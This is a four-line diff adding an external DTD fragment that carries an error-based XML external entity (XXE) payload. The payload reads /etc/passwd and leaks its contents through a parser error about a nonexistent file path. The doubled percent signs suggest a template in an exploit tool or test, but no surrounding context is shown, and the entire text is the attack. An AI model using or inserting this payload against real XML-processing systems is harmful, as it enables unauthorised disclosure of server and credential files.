@@ -1,0 +1,4 @@
+<!ENTITY %% file SYSTEM "file:///etc/passwd">
+<!ENTITY %% eval "<!ENTITY &#37; err SYSTEM 'file:///nonexistent/%file;'>">
+%%eval;
+%%err;
